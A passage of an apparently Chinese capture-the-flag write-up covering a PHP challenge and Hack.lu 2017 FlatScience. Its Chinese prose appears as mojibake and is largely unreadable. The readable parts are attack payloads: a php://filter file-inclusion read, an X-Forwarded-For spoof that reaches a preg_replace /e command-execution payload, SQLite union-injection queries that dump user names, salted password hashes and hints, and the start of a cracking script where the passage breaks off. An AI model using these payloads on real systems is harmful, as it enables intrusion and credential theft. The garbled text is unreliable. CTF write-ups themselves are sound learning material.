(1).png"></p><p>FUZZè·‘ä¸€ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼Œå‘ç°æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå”¯ç‹¬<code>#</code>ä¸ä¼šè¿‡æ»¤ï¼Œä¸”ä¼šä½œä¸ºæˆªæ–­ç¬¦å·</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393520.png" alt="1604245457548(1).png"></p><p>æ‰€ä»¥è€ƒè™‘èƒ½ä¸èƒ½SQLæ³¨å…¥ï¼Œä½†æ˜¯å°è¯•äº†å¾ˆä¹…éƒ½æ²¡æœ‰ç»“æœï¼Œå®åœ¨æ²¡åŠæ³•ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„wpå¾—çŸ¥ï¼Œæ­¤å¤„éœ€è¦<strong>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡phpä¼ªåè®®<code>php://filter</code>æ¥è¯»å–æ–‡ä»¶</strong>ã€‚</p><p>OKï¼Œæ—¢ç„¶çŸ¥é“äº†åˆ©ç”¨æ‰‹æ®µï¼Œå¼€å§‹å­¦ä¹ å‘—ã€‚</p><p>å®˜æ–¹è§£é‡Š<code>php://filter</code>æ˜¯ ä¸€ç§åŸå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ï¼Œå…¶å®å°±æ˜¯å¯¹æ•°æ®æµè¿›è¡Œè¿‡æ»¤ï¼Œä»¥å½“å‰é¢˜ç›®çš„payloadæ¥å®ä¾‹åˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¾¹ï¼š</p><ul><li><strong>php:</strong> ä»£è¡¨ä¸€ç§phpåè®®ï¼›</li><li>**php://filter/ **è¡¨ç¤ºç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼›</li><li><strong>read=convert.base64-encode</strong> ä»£è¡¨è¯»å–çš„æ˜¯base64ç¼–ç åçš„ç»“æœï¼›</li><li>**/resource=index.php **è¡¨ç¤ºè¦è¯»å–çš„ç›®æ ‡æ–‡ä»¶æ˜¯index.phpã€‚</li></ul><p>å½“ç„¶è¿˜å¯ä»¥å†™æ–‡ä»¶ï¼Œå…·ä½“è§ä»¥ä¸‹é“¾æ¥åŠå®˜æ–¹æ‰‹å†Œï¼š</p><p><a href="https://www.php.net/manual/zh/wrappers.php.php"><strong>https://www.php.net/manual/zh/wrappers.php.php</strong></a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html"><strong>https://www.cnblogs.com/linuxsec/articles/12684259.html</strong></a></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393571.png" alt="1604246054845 (1).png"></p><p>æ‰€ä»¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>è¯»å–index.phpçš„base64ç¼–ç åçš„å†…å®¹ï¼Œå¹¶è¾“å‡ºåœ¨é¡µé¢</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393584.png" alt="1604246697723 (1).png"></p><p>base64è§£ç åï¼Œå¾—åˆ°index.phpçš„æºç ï¼Œä¸»è¦çš„éƒ¨åˆ†æœ‰ä»¥ä¸‹3ä¸ªç‰‡æ®µ</p><p><strong>1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ctype_alnum(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä¸»è¦åœ¨ç¬¬9è¡Œï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆä¼šè¿”å›å­—ç¬¦ä¸²</p><p><strong>2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µå¯¹åŒ…å«çš„æ–‡ä»¶ååšäº†è¿‡æ»¤ï¼Œå¹¶å¯¹åŒ…å«index.phpçš„è¿”å›å€¼åšäº†é‡å†™ï¼Œæ‰€ä»¥æ— æ³•åŒ…å«ç›´æ¥å¾—åˆ°index.phpæºç ï¼Œç„¶åå¦‚æœæ²¡æœ‰è¢«ç”„åˆ«åˆ°çš„è¯ï¼Œæœºä¼šæ‰§è¡Œ14è¡Œçš„åŒ…å«æ–‡ä»¶æ“ä½œï¼Œæ²¡æœ‰å…¶ä»–çš„å®‰å…¨æ ¡éªŒäº†</p><p><strong>3</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µæ˜¯æœ€å…³é”®çš„ï¼Œæºç æ˜¾ç¤ºï¼Œå¦‚æœ<code>X_FORWARDED_FOR</code>æ˜¯127.0.0.1çš„è¯ï¼Œå°±ä¼šè§¦å‘ä¸‹é¢çš„ä»£ç é€»è¾‘ï¼Œæ¥å—3ä¸ªå‚æ•°è¿›è¡Œ<code>preg_replace()</code>å‡½æ•°çš„æ­£åˆ™æ›¿æ¢ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹è¿™ä¸‰ä¸ªå‚æ•°åšå®‰å…¨æ ¡éªŒã€‚</p><p>åœ¨ä¹‹å‰çš„æ¼æ´å¤ç° <a href="https://www.yyxzz.net/articles/59.html"><strong>CVE-2016-5734 - phpmyadminè¿œç¨‹ä»£ç æ‰§è¡Œ</strong></a> ä¸­å­¦ä¹ åˆ°ï¼Œ<code>preg_replace()</code>å‡½æ•°å½“æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼æ˜¯<code>/e</code>æ—¶ï¼Œä¼šè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå…·ä½“å¯çœ‹ä¹‹å‰çš„æ¼æ´å¤ç°æ–‡ç« ä¸­çš„åˆ†æã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†<code>X_FORWARDED_FOR</code>è®¾å®šä¸º127.0.0.1ï¼Œç„¶åæ„é€ payloadæ‰§è¡Œå‘½ä»¤è¯»å–flagå³å¯ã€‚</p><p>ä½¿ç”¨ModHeaderæ’ä»¶æ·»åŠ è¯·æ±‚å¤´ï¼Œè®¿é—®index.phpé¡µé¢å³å¯è§¦å‘å†…éƒ¨æµ‹è¯•é¡µé¢</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393603.png" alt="1604247980550 (1).png"></p><p>æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/(.)/e&amp;rep=system(<span class="string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)&amp;sub=aaa</span><br></pre></td></tr></table></figure><p>flagçš„è·¯å¾„æ˜¯ä¸æ–­<code>ls -l</code>å‡ºæ¥çš„ï¼Œå‘é€å³å¯åŒ…å«è¯¥æ–‡ä»¶å¾—åˆ°Flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393621.png" alt="1604248139499.png"></p><h3 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a></p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">https://blog.csdn.net/destiny1507/article/details/82347371</a></p><h2 id="â­-FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥-pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰"><a href="#â­-FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥-pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰" class="headerlink" title="â­ FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥+pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰"></a>â­ FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥+pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰</h2><p>é¢˜ç›®æ¥æºï¼šHack.lu-2017</p><p>é¡µé¢æ˜¯ä¸€äº›é“¾æ¥ï¼Œç‚¹è¿›å»å…¨æ˜¯pdfæ–‡ä»¶ï¼Œæœ‰å¤šå±‚ç›®å½•åµŒå¥—ï¼Œæ²¡æœ‰å‘ç°å¯ç–‘ç‚¹</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395488.png" alt="1604305384872.png"></p><p>Dirbæ‰«æå‘ç°äº†robots.txtæ–‡ä»¶ï¼Œå¾—åˆ°ä¸¤ä¸ªè·¯å¾„ï¼šlogin.phpå’Œadmin.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;login.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br></pre></td></tr></table></figure><p>admin.phpæç¤ºéœ€è¦adminè´¦æˆ·ç™»å½•ï¼Œå°è¯•SQLæ³¨å…¥å’Œç™»å½•ç»•è¿‡éƒ½å¤±è´¥äº†ï¼ŒåŸç å¤„æ³¨é‡Š<code>&lt;!-- do not even try to bypass this --&gt;</code>ï¼Œçœ‹æ¥è¡Œä¸é€šï¼Œæš‚æ—¶æ”¾ä¸‹</p><p>åœ¨login.phpä¸­çš„usrå‚æ•°å‘ç°äº†SQLæ³¨å…¥æ¼æ´ï¼Œä½¿ç”¨å•å¼•å·åˆ¶é€ æŠ¥é”™ï¼Œå¾—åˆ°æ•°æ®åº“ç±»å‹SQLiteä»¥åŠç½‘ç«™æ ¹ç›®å½•<code>/var/www/html</code></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395499.png" alt="1604305624026.png"></p><p>è€Œä¸”åœ¨æœ¬é¡µé¢çš„æºç å¤„ä¹Ÿå‘ç°äº†æ³¨é‡Šæç¤ºï¼š<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>ï¼Œæ„æ€æ˜¯è¦**?debug<strong>å—ï¼Œurlåè¾“å…¥</strong>?debug**æœç„¶é¡µé¢ç»™å‡ºäº†login.phpæºç ï¼Œæˆªå–éƒ¨åˆ†å…³é”®çš„phpä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å®¡è®¡ç»“æœï¼š</strong></p><ul><li>ç¬¬8è¡Œçš„SQLæŸ¥è¯¢è¯­å¥çš„ç¡®å­˜åœ¨æ³¨å…¥ï¼Œæœ‰nameå’Œpasswordå­—æ®µï¼Œå­˜å‚¨çš„passwordä¸ºæ‹¼æ¥å¹¶åšSHA1çš„ç»“æœ</li><li>å­˜åœ¨idå‚æ•°ï¼Œåˆ©ç”¨æŸ¥è¯¢ç»“æœç”ŸæˆCookieï¼Œæ­¤å¤„ä¼šäº§ç”Ÿå›æ˜¾</li><li>GETä¼ å‚debugæ—¶ï¼Œä¼šè¾“å‡ºlogin.phpæºç </li></ul><p>æ‰€ä»¥æ€è·¯å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œåˆ©ç”¨SQLæ³¨å…¥ï¼ŒæŸ¥è¯¢adminè´¦æˆ·çš„å¯†ç ç„¶åç ´è§£æˆ–ç¢°æ’ã€‚</p><p><strong>æ³¨å…¥è¿‡ç¨‹ï¼š</strong></p><p>æ ¹æ®å®¡è®¡ç»“æœï¼Œæµ‹è¯•æ˜¯å¦ä¼šæœ‰æ³¨å…¥å›æ˜¾ï¼Œå½“æŸ¥è¯¢åˆ°ç»“æœæ—¶ï¼Œå°±ä¼šè®¾å®šCookieï¼Œä»¥å­˜åœ¨çš„adminç”¨æˆ·ä¸ºä¾‹</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395530.png" alt="1604306380187.png"></p><p>é€šè¿‡æ˜¯å¦æœ‰Set-Cookieå­—æ®µï¼Œè¿›è¡Œorder byå’Œunion selectè”åˆæŸ¥è¯¢ï¼Œå¾—åˆ°å›æ˜¾ç‚¹æ˜¯åœ¨æŸ¥è¯¢ç»“æœçš„ç¬¬2ä¸ªå­—æ®µ</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395538.png" alt="1604306542142.png"></p><p>SQLiteæ•°æ®åº“ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªsqlite_masteré»˜è®¤è¡¨ï¼Œç±»ä¼¼äºmysqlä¸­çš„information_schemaï¼Œå¯ä»¥åœ¨sqlite_masterä¸­æŸ¥è¯¢æ‰€æœ‰çš„è¡¨æ˜ä»¥åŠä¹‹å‰æ‰§è¡Œè¿‡çš„åˆ›å»ºè¡¨çš„sqlè¯­å¥ï¼Œå…·ä½“ï¼š</p><blockquote><p><strong>sqlite_master</strong> è¡¨æ˜¯ SQLite çš„ç³»ç»Ÿè¡¨ã€‚è¯¥è¡¨è®°å½•è¯¥æ•°æ®åº“ä¸­ä¿å­˜çš„è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å’Œè§¦å‘å™¨ä¿¡æ¯ã€‚æ¯ä¸€è¡Œè®°å½•ä¸€ä¸ªé¡¹ç›®ã€‚åœ¨åˆ›å»ºä¸€ä¸ª SQLIite æ•°æ®åº“çš„æ—¶å€™ï¼Œè¯¥è¡¨ä¼šè‡ªåŠ¨åˆ›å»ºã€‚sqlite_master è¡¨<strong>åŒ…å«5åˆ—</strong>ã€‚</p><p><strong>type</strong>ï¼šè®°å½•äº†é¡¹ç›®çš„ç±»å‹ï¼Œå¦‚ tableã€indexã€viewã€trigger ã€‚</p><p><strong>name</strong>ï¼šè®°å½•äº†é¡¹ç›®çš„åç§°ï¼Œå¦‚è¡¨åã€ç´¢å¼•åç­‰ã€‚</p><p><strong>tbl_name</strong>ï¼šè®°å½•æ‰€ä»å±çš„è¡¨åï¼Œå¦‚ç´¢å¼•æ‰€åœ¨çš„è¡¨åã€‚å¯¹äºè¡¨æ¥è¯´ï¼Œè¯¥åˆ—å°±æ˜¯è¡¨åæœ¬èº«ã€‚</p><p><strong>rootpage</strong>ï¼šè®°å½•é¡¹ç›®åœ¨æ•°æ®åº“é¡µä¸­å­˜å‚¨çš„ç¼–å·ã€‚å¯¹äºè§†å›¾å’Œè§¦å‘å™¨ï¼Œè¯¥åˆ—å€¼ä¸º0æˆ–è€… NULL ã€‚</p><p><strong>sql</strong>ï¼šè®°å½•åˆ›å»ºè¯¥é¡¹ç›®çš„ SQL è¯­å¥ã€‚</p></blockquote><p>æ‰€ä»¥å¯æ„é€ çš„SQLè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> tbl_name <span class="keyword">from</span> sqlite_master <span class="comment">-- æŸ¥è¯¢è¡¨å</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="comment">-- æŸ¥è¯¢æ‰§è¡Œè¿‡çš„sqlè¯­å¥</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> <span class="comment">-- æŸ¥è¯¢åˆ›å»ºUserè¡¨çš„SQLè¯­å¥</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥åˆ©ç”¨limitå­å¥ï¼Œé€ä¸ªæŸ¥è¯¢è¡¨åï¼Œå†é€šè¿‡æŸ¥è¯¢åˆ›å»ºè¯¥è¡¨çš„sqlè¯­å¥å¾—åˆ°å…¶å­—æ®µä¿¡æ¯ï¼Œå·²ç»æŸ¥åˆ°äº†å­˜åœ¨Usersè¡¨ï¼ŒæŸ¥è¯¢å…¶å­—æ®µä¿¡æ¯ï¼š</p><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?usr<span class="operator">=</span><span class="string">&#x27;union select 1,sql from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; and tbl_name=&#x27;</span>Users<span class="string">&#x27; --+&amp;pw=aa&amp;id=1</span></span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395559.png" alt="1604307079546.png"></p><p>å¾—åˆ°4ä¸ªå­—æ®µï¼šidã€nameã€passwordã€hint</p><p>åˆ©ç”¨èšåˆå‡½æ•°<code>group_concat()</code>åˆ†åˆ«æŸ¥è¯¢nameã€passwordå’Œhint</p><p>payloadï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?usr=&#x27; union select 1,group_concat(name,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(password,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(hint,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395567.png" alt="1604307326795.png"></p><p>ç»Ÿè®¡æŸ¥åˆ°çš„æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name:  admin</span><br><span class="line">password:  34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line">hint:  my+fav+word+in+my+fav+paper%3F%21</span><br><span class="line"></span><br><span class="line">fritze</span><br><span class="line">3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">my+love+is%E2%80%A6%3F</span><br><span class="line"></span><br><span class="line">hansi</span><br><span class="line">54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">the+password+is+password</span><br></pre></td></tr></table></figure><p>å› ä¸ºå¯†ç çš„æ•£åˆ—å€¼æ˜¯åŠ ç›çš„ï¼Œæ‰€ä»¥ç½‘ä¸Šç ´è§£ä¸å‡ºæ¥ï¼Œå†™äº†ä¸€ä¸ªPythonè„šæœ¬å¯¹å¸¸ç”¨çš„2ä¸‡ä¸ªå¯†ç åŒæ ·åŠ ç›åšSHA1æ•£åˆ—è¿›è¡Œç¢°æ’ï¼Œæ²¡æœ‰å¾—åˆ°ç»“æœã€‚</p><p>hintæç¤ºå¯†ç å°±åœ¨é‚£äº›pdfä¸­ï¼Œå¯¹<code>%E2%80%A6%3F</code>åšURLè§£ç åé€ä¸ªpdfæŸ¥è¯¢ä¹Ÿæ²¡æœ‰å¾—åˆ°ç»“æœã€‚æ‡µäº†ï¼Œæ²¡åŠæ³•ï¼Œçœ‹ä¸€ä¸‹å¸ˆå‚…ä»¬çš„wpå§ï¼Œå¾—çŸ¥éœ€è¦çˆ¬å–æ‰€æœ‰PDFï¼Œå¯¹å…¶ä¸­çš„å•è¯è¿›è¡ŒåŠ ç›SHA1åšç¢°æ’æµ‹è¯•ã€‚</p><p>OKï¼Œè‡ªå·±æ’¸ä»£ç å§ï¼Œä¸ç”¨å¸ˆå‚…ä»¬å†™å¥½çš„äº†ï¼Œæ¯•ç«Ÿä¹Ÿæ˜¯å­¦äº†ä¸€æ®µæ—¶é—´Pythonçš„ï¼Œè€Œä¸”ä¹‹å‰ç»™å¥³ç›†å‹å†™è‹±æ–‡PDFç¿»è¯‘å·¥å…·æ—¶å·²ç»æœ‰ä¸€äº›è½®å­äº†ï¼Œç›´æ¥æ‹¿æ¥ç”¨å§ï¼ˆå°å£°bbï¼šç»™å°é»‘åŒå­¦çš„ç¿»è¯‘å·¥å…·åˆ°ç°åœ¨è¿˜æ²¡å†™å¥½ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ç¿»è¯‘apiï¼‰</p><p>å¤§æ¦‚èŠ±äº†1ä¸ªåŠä¸ªå°æ—¶å†™å®Œã€‚ã€‚ã€‚å¤ªæ…¢äº†ğŸ˜“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 